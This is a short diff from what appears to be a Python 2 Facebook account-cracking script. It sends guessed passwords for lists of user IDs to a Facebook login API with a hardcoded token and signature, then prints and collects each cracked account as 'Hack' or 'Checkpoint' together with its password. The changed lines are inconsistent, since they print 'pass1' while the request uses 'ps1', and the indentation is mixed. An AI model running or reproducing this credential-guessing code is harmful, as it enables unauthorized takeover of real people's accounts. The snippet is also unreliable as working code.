@@ -4232,14 +4232,16 @@ def pilih_army():
 			love=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			j=json.load(love)
 			if 'www.facebook.com' in j['error_msg']:
-                            print(R+'[Cp] ' + b['name']
-			    print(P+'[ID]        |  '+user+' | '+ps1)
-			    cp.append(user+ps1)
+                            print '\033[1;96m Checkpoint' + b['name']
+                            print '\033[1;93m ID ' + user
+		            print '\033[1;95mPassword ' + pass1
+			    cp.append(user+pass1)
 			else:
 			    if 'access_token' in j:
-			        print(G+'[Hack] ' + b['name']
-                                print (P+'[ID]   |  'user'   | '+ps1)
-			        ok.append(user+ps1)
+			        print '\033[1;92m Hack' + b['name']
+                                print '\033[1;93m ID ' + user
+		                print '\033[1;95mPassword ' + pass1
+			        ok.append(user+pass1)
 																	
 															
 		except:
